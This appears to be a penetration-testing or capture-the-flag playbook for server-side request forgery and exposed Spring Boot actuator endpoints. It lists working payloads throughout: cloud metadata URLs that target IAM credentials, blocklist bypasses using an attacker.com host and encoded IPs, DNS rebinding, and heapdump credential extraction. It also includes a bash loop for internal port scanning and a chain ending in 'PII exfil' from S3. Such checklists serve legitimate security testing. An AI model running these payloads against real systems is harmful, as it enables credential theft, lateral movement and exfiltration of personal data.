## SSRF & Internal Network Exposure

- **[Primary Probe]** Identify all URL-accepting params (webhooks, avatar, PDF renderer, integrations); inject `http://<interactsh>/test`; monitor for OOB
  - **[Signal: HTTP ping received]** Escalate: AWS IMDSv1 `http://169.254.169.254/latest/meta-data/iam/security-credentials/`, GCP `http://metadata.google.internal/computeMetadata/v1/`, Alibaba `http://100.100.100.200/`
  - **[Dead End: Only DNS resolves]** DNS rebinding: register domain → `127.0.0.1` after TTL expiry
  - **[Dead End: Only HTTPS allowed]** Protocol smuggling: `https://attacker.com@169.254.169.254/` or `http://[::ffff:169.254.169.254]/`
  - **[Dead End: IP blocklist]** Bypass via redirects: `302 → http://127.0.0.1:8080` on attacker server; decimal `http://2130706433/`; octal `http://0177.0.0.1/`
  - **[Dead End: Redirects disabled]** DNS bypass: `http://localtest.me/` or `http://1.1.1.1.nip.io`
  - **[Data Chaining]** IMDSv1 creds → AWS CLI lateral movement → S3 bucket enum → PII exfil

### Spring Boot Actuator Exposure

- **[Primary Probe]** On Java/Spring (JSESSIONID, `/login` redirects), probe unauthenticated actuator: `/actuator`, `/actuator/heapdump`, `/actuator/env`, `/actuator/configprops`, `/actuator/mappings`
  - **[Signal: `/actuator` returns 200 + `_links`]** Follow listed endpoints; auth may not be enforced everywhere
  - **[Signal: `/actuator/heapdump` returns 200]** Download, extract strings, search for prior HTTP bodies, creds, CSRF tokens, internal routes, flags
  - **[Dead End: `/actuator/env` blocked]** Prioritize heapdump; env lockout ≠ heapdump lockout
  - **[Data Chaining]** Heapdump credential artifacts → admin route → flag/secret retrieval

**Internal Port Scan via SSRF:**
```bash
for p in 22 80 443 3306 5432 6379 8080 8443 9200 27017; do echo "http://127.0.0.1:$p/"; done > ssrf-ports.txt
```

***
